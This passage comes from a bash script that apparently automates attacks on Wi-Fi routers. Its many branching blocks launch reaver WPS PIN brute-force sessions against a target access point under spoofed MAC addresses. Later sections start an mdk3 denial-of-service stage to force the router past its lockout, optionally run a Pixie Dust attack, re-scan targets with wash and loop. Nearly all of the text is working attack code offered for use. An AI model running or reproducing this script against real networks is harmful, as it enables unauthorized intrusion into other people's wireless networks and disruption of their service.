xterm -g 80x10-1+1 -T "Reaver5-no-dh-test12345670" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60  --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver6-no-dh-test12345670" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver6-no-dh-test12345670" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver7-no-dh-test12345670" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver7-no-dh-test12345670" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver8-no-dh-test12345670" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver8-no-dh-test12345670" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver5h-no-dh-test12345670" -e "reaver -i $MON -a -b $TARGETAP1 -L -vvv -x 60  --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver5h-no-dh-test12345670" -e "reaver -i $MON -b $TARGETAP1 -L -vvv -x 60  --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver6h-no-dh-test12345670" -e "reaver -i $MON -a -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver6h-no-dh-test12345670" -e "reaver -i $MON -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver7h-no-dh-test12345670" -e "reaver -i $MON -a -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver7h-no-dh-test12345670" -e "reaver -i $MON -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver8h-no-dh-test12345670" -e "reaver -i $MON -a -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver8h-no-dh-test12345670" -e "reaver -i $MON -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi


TIMING_LOCKED_fn

	fi

###End  Reaver Program Booleans no -e essid End###

###Start Reaver Program Booleans Start with -e essid###

########PIN Adds

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver5e-no-dh-test12345670" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60  --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver5e-no-dh-test12345670" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60  --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver6e--no-dh-test12345670" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver6e--no-dh-test12345670" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver7e-no-dh-test12345670" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver7e-no-dh-test12345670" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &


		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver8e--no-dh-test12345670" -e "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver8e--no-dh-test12345670" -e "reaver -i $MON -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver5he-no-dh-test12345670" -e "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60  --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver5he-no-dh-test12345670" -e "reaver -i $MON -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60  --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver6he-no-dh-test12345670" -e "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver6he-nog-dh-test12345670" -e "reaver -i $MON -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver7he--no-dh-test12345670" -e "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &
		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver7he--no-dh-test12345670" -e "reaver -i $MON -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 80x10-1+1 -T "Reaver8he-no-dh-test12345670" -e "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 80x10-1+1 -T "Reaver8he-no-dh-test12345670" -e "reaver -i $MON -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/tmp/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

		fi


TIMING_LOCKED_fn

	fi

}

#~~~~~~~~~~~~~End Reaver Startpin Booleans End~~~~~~~~~~~~~~~~~#

 if [ $EVTEN -gt $RETESTPIN ]; then

       EVTEN=1

	fi


#MACSTRIP=$(echo $TARGETAP1 | tr -d -c [:xdigit:])


if [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $EVTEN -eq 1 ]]; then

		sleep 1
		LIVE1=90
		STARTPIN_BOOLEANS_fn

		else

		R_BOOLEANS_fn

			fi

###Pin Found

PINFOUND_fn


###########Start Determine to keep file or erase Start###########


#Keep old channel for MDK3 12

CHANNEL_MDK=$CHANNEL1

####Reload config file####

source /root/VARMAC_CONFIG/$SOURCENAME

if [ $DAMP_MDK == n ] || [ $DAMP_MDK == N ]; then

		ADVANMON=n

		fi

#####################Start MDK3 DOS############################

DDOS_fn

if  [[ $DAMP_MDK == y || $DAMP_MDK == Y ]] && [[ $LINECAP -eq 1 ]]; then

	echo -e " "
	echo -e "$info  Stage III DDOS Attack Type $yel$MDKTYPE1$info is Starting"
        echo -e " "
	echo -e "$info Router Pause/Recovery Time = $yel$PAUSE$info sec"
        echo -e "$info REAVER Live Time           = $yel$LIVE1$info sec"
	echo -e "$info MDK3 Attack Time           = $yel$MDKLIVE$info sec"
	echo -e " "

		if  [[ $MDK3_COUNT == y || $MDK3_COUNT == Y ]]; then

seconds=$MDKLIVE; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$info  Time before Router Recovery and Wash scan(Stage IV) $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

			done
				fi

		if  [[ $MDK3_COUNT == n || $MDK3_COUNT == N ]]; then

			sleep $MDKLIVE

			fi
				fi

##########DAMP_MDK=N

if [[ $DAMP_MDK == n || $DAMP_MDK == N ]]; then

	echo -e " "
	echo -e "$info  Stage III DDOS Attack Type $yel$MDKTYPE1$info is Starting"
        echo -e " "
	echo -e "$info Router Pause/Recovery Time = $yel$PAUSE$info sec"
        echo -e "$info REAVER Live Time           = $yel$LIVE1$info sec"
	echo -e "$info MDK3 Attack Time           = $yel$MDKLIVE$info sec"
	echo -e " "

		if  [[ $MDK3_COUNT == y || $MDK3_COUNT == Y ]]; then

seconds=$MDKLIVE; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$info  Time before Router Recovery and Wash scan(Stage IV) $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

			done
				fi

		if  [[ $MDK3_COUNT == n || $MDK3_COUNT == N ]]; then

			sleep $MDKLIVE

			fi
				fi

#processes=ps -a or ps -A
echo -e "$txtrst "
killall -q tkiptun-ng
killall -q airodump-ng
killall -q aireplay-ng
killall -q reaver 
killall -q mdk3
sleep 1
killall -q xterm
killall -q tee
clear
sleep 2

### Clear any files from VARMAC_WASH/ folder ###

rm -rfv VARMAC_WASH/* &> /dev/null
clear

###End Clear any files from VARMAC_WASH/ folder End###

####reload config file

source /root/VARMAC_CONFIG/$SOURCENAME

if [ $DAMP_MDK == n ] || [ $DAMP_MDK == N ]; then

		ADVANMON=n

		fi

# Once Pixie Dust has found key override config files use of Pixiedust

if [ $PIXIE_OVERIDE == 1 ]; then

	 USE_PIXIE=n

            fi

if [[ $USE_PIXIE == y || $USE_PIXIE == y ]]; then
		echo ""	
		PDDSA_fn
		sleep 5
		fi


#xterm -g 100x30-1+1 -T "wash" -e "wash -i $MON 2>&1 | tee VARMAC_WASH/wash01.txt" &

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 100x30-1+1 -T "wash target scan" -e "wash -i $MON -C 2>&1 | tee VARMAC_WASH/wash01.txt" &

			fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 100x30-1+1 -T "wash target scan" -e "wash -i $MON 2>&1 | tee VARMAC_WASH/wash01.txt" &

			fi

sleep 1

######

echo ""
echo -e "$info   For Clients that have been seen associated to $TARGETAP1 see:$txtrst"
echo ""
echo -e "$txtrst  root/VARMAC_AIRCRACK/$TARGETAP1-client.txt"
echo ""
echo -e "$info   Clients currently associated to $TARGETAP1 are seen below:$txtrst"
echo ""

#check var not null
if [ ! -z $CLIASO_MAX ]; then

echo -e "$txtrst  $CLIASO_MAX"
echo "  $CLIASO_MID"
echo "  $CLIASO_LOW"

	else

	echo -e "$txtrst   No clients are currently associated to $TARGETAP1"

		fi
######

	echo -e "$info " 
	echo -e "$info Router Pause Recovery with Wash Scan(Stage IV) is Starting."
	echo -e " "
	echo -e "$info Router Pause/Recovery Time = $yel$PAUSE$info sec"
        echo -e "$info REAVER Live Time           = $yel$LIVE1$info sec"
	echo -e "$info MDK3 Attack Time           = $yel$MDKLIVE$info sec"
	echo -e "$txtrst "

if  [ $WASH_COUNT == y ] || [ $WASH_COUNT == Y ]; then

seconds=$PAUSE; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$info  Time before program restart $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 
	
	done

	fi

if  [ $WASH_COUNT == n ] || [ $WASH_COUNT == N ]; then

		sleep $PAUSE

		fi

echo -e "$txtrst "

# sleep $PAUSE
killall -q tkiptun-ng
killall -q airodump-ng
killall -q aireplay-ng
killall -q wash
killall -q reaver 
killall -q mdk3
sleep 1
killall -q xterm
clear
sleep 2

###############################END USR Block################################################

#OVERRIDE_MDK3=n

source /root/VARMAC_CONFIG/$SOURCENAME

if [ $DAMP_MDK == n ] || [ $DAMP_MDK == N ]; then

		ADVANMON=n

		fi

sleep 2

### Put in channel if WASH found ###

CHANNEL_LOCK=0

###End Put in channel if WASH found End###

CHANNEL_LOCK=$(cat < VARMAC_WASH/wash01.txt | awk -v mac=$TARGETAP1 -F' ' '{ if($1 == mac) {print $2}}')


if [ $CHANNEL_LOCK > "0" ]; then

         CHANNEL1=$CHANNEL_LOCK

			fi

sleep 1
rm -f /tmp/tarap02.txt
rm -f /tmp/tarap03.txt
rm -f /tmp/tarap04.txt
rm -f /tmp/tarap05.txt
rm -f /tmp/tarap06.txt
rm -f /tmp/tarap*

killall -q tkiptun-ng
killall -q airodump-ng
killall -q wash
killall -q reaver 
killall -q mdk3
sleep 1
killall -q xterm
killall -q tput
clear
airmon-old_fn stop $MON1
sleep 1
airmon-old_fn stop $MON2
sleep 1
let COUNT=COUNT-1
let FN=FN+1

if [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]]; then

		let EVTEN=EVTEN+1

			fi

sleep 1

done

echo "loops completed"
sleep 10
